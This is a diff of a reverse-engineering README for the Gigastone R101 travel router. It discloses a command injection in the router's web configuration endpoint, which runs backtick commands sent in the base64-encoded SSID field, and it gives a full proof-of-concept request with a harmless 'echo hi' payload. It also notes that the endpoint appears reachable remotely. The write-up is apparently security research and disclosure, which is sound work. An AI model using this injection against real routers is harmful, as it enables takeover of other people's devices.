@@ -1,10 +1,30 @@
 # RE of Gigastone R101 Mini Wireless Router / Wireless Travel Router
 
+The R101 is a cheap wireless router sold by Gigastone.
+Gigastone is a electronics brand based in Taiwan.
+
+[Amazon link1.](https://www.amazon.com/Gigastone-GS-TR1-R-Wireless-Travel-Router/dp/B01DR04V90)
+[Amazon link2.](https://www.amazon.com/Gigastone-TR1-Wireless-Extension-Processor/dp/B0BVTYYDQH/)
+
 ![41-czovIRFL _AC_SX522_](https://github.com/skyler-ferrante/Gigastone-RE/assets/24577503/36e0f064-4b5e-4bf8-bdb5-3b70db17efa8)
 
-We can find Gigastones filing for R101 in the [FCC ID](https://fccid.io/PLE-TRR1011) database
+# Web interface
 
-[Amazon link](https://www.amazon.com/Gigastone-GS-TR1-R-Wireless-Travel-Router/dp/B01DR04V90)
+After logging in with the default credentials, I watched network traffic from dev tools while setting the SSID.
+It seems the device uses `tr1.cgi?cgi=2` for configuration.
+The device uses base64 to send the SSID.
+This field has command injection, and we can use the new SSID as the commands output.
+
+SSID is set to base64 of string `` `echo hi` `` (`YGVjaG8gaGlgCg==`)
+```
+http://<ROUTER_IP>/cgi-bin/tr1.cgi?cgi=2&mode=0&ssid=YGVjaG8gaGlgCg==&ht=0&channel=0&dhcp=50&static=0&ip=0.0.0.0&subnet=0.0.0.0&gw=0.0.0.0&pppmode=0&pppusr=bnVsbA==&ppppwd=bnVsbA==&pwd=
+```
+
+This seems to be hittable from a remote IP.
+
+# Hardware/Serial
+
+We can find Gigastones filing for R101 in the [FCC ID](https://fccid.io/PLE-TRR1011) database
 
 Looking at internal photos from FCCID, it looks like there's a serial port in the corner opposite the power button.
 
